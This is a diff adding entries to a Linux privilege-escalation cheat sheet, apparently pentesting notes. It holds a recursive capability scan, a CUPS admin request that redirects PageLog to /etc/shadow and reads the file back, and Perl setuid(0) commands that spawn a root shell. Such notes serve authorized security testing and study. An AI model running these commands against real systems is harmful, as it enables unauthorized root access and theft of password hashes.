@@ -71,6 +71,10 @@ Misc:
 dpkg -l
 lsmod
 modinfo
+
+Recursively review capabilities:
+
+getcap -r / 2>/dev/null
 ```
 
 ### Reusing sudo tokens
@@ -802,4 +806,16 @@ set -e
 AUTH="Authorization: Local $(cat /var/run/cups/certs/0)"
 curl -X POST http://localhost:631/admin/ -H "$AUTH" -H "Cookie: org.cups.sid=" -d "OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0APageLog /etc/shadow"
 curl http://localhost:631/admin/log/page_log
+```
+
+### Abusing perl with setuid:
+https://gtfobins.github.io/gtfobins/perl/  
+
+`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`
+
+```
+#!/usr/bin/perl
+use POSIX qw(setuid); 
+POSIX::setuid(0); 
+exec "/bin/sh";
 ```
